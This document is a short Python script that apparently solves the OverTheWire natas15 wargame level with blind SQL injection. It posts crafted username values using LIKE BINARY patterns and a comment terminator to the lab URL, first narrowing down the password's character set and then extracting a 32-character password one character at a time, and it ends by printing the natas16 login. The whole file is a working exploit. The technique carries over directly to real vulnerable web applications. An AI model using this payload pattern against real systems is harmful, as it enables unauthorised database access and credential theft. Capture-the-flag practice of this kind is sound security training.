"""Cracking natas password!
"""

# Standart library import
from time import sleep

# Third party import
from requests import post

# Local imports
from variables import auth, URL, CHARS, NAME, STOP_TIME

# Variables
password = ""
filtered_characters = ""


def get_respones(character: str) -> str:
    """get respones of url with data and auth

    Args:
        character (str): testing character

    Returns:
        str: return character if current and '' if not current
    """
    respones = post(
        URL,
        data={
            "username": f'{NAME}" AND password LIKE BINARY "{password}{character}%" #'
        },
        auth=auth
    )
    if "exists" in respones.text:
        return character
    return ''


for char in CHARS:
    sleep(STOP_TIME)
    testing_respones = post(
        URL,
        data={
            "username": f'{NAME}" AND password LIKE BINARY "%{char}%" #'
        },
        auth=auth
    )
    if "exists" in testing_respones.text:
        filtered_characters += char

print(f"Currect characters: {filtered_characters}")

for _ in range(32):
    sleep(STOP_TIME*10)
    for testing_character in filtered_characters:
        sleep(STOP_TIME)
        current_char = get_respones(testing_character)
        if current_char:
            password += current_char
            break
    print(f"length: {len(password)}, password: {password}")

print("-"*64)
print("Link: http://natas16.natas.labs.overthewire.org/index.php")
print("Username: natas16")
print(f"Password: {password}")
